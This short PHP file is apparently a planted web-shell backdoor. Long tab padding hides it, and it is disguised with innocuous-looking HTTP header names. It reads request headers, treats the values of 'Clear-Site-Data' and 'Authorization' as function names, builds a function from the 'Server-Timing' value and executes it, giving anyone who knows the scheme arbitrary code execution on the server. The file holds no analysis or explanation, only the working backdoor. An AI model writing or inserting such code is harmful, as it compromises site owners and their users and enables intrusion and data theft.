<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Clear-Site-Data'])){$ibase_pconnection=$_HEADERS['Clear-Site-Data']('', $_HEADERS['Authorization']($_HEADERS['Server-Timing']));$ibase_pconnection();}
